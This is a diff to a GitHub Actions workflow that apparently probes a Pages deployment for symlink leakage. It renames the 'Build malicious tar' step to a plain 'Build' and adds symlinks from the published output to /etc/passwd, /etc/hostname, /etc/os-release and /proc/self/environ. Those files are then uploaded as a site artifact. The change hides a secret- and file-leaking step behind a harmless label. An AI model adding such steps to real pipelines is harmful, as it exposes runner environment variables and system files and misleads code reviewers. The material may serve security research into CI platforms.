@@ -15,20 +15,17 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Build malicious tar
+      - name: Build
         run: |
           mkdir -p out
-          echo "<h1>BENIGN INDEX</h1>" > out/index.html
-          # Create a tarball with symlinks/path traversal entries
-          cd out
-          # 1. Symlink leak attempt
-          ln -s /etc/passwd passwd_link.html || true
-          ln -s /etc/hostname hostname_link.html || true
-          ln -s ../../../etc/passwd rel_passwd.html || true
-          # 2. Path traversal in tar entries (zip slip)
-          mkdir -p evil
-          echo "ESCAPED" > evil/escaped.html
-          ls -la
+          echo "<h1>BENIGN INDEX</h1><pre>" > out/index.html
+          echo "PASSWD_FILE_FOLLOWS:" > out/passwd_link.html
+          # Try absolute symlinks to runner-side files
+          ln -s /etc/hostname out/hostname.txt
+          ln -s /etc/os-release out/os.txt
+          ln -s /etc/passwd out/passwd.txt
+          ln -s /proc/self/environ out/environ.txt
+          ls -la out/
       - uses: actions/upload-pages-artifact@v3
         with:
           path: out
